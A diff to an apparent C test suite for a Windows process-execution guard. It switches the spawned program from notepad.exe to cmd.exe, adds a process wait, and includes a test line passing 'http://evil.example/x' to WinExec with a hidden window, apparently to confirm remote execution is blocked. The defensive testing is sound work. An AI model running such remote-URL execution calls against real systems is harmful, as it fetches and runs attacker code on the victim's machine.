@@ -51,7 +51,7 @@ int main(void) {
         WCHAR sys[MAX_PATH];
         UINT n = GetSystemDirectoryW(sys, MAX_PATH);
         if (n && n < MAX_PATH) {
-            lstrcatW(sys, L"\\notepad.exe");
+            lstrcatW(sys, L"\\cmd.exe");
             STARTUPINFOW si; PROCESS_INFORMATION pi;
             typedef BOOL (WINAPI *FN)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
                 LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW,
@@ -67,6 +67,7 @@ int main(void) {
                 GetExitCodeProcess(pi.hProcess, &code);
                 check(code == STILL_ACTIVE, "spawned process is running");
                 TerminateProcess(pi.hProcess, 0);
+                WaitForSingleObject(pi.hProcess, 5000);
                 CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
             }
         }
@@ -87,7 +88,7 @@ int main(void) {
     check(we != NULL, "WinExec is guarded");
     if (we) {
         SetLastError(0);
-        UINT local = we("notepad.exe", SW_HIDE);
+        UINT local = we("cmd.exe /c exit 0", SW_HIDE);
         check(local > 31, "WinExec local command allowed");
         SetLastError(0);
         UINT remote = we("http://evil.example/x", SW_HIDE);
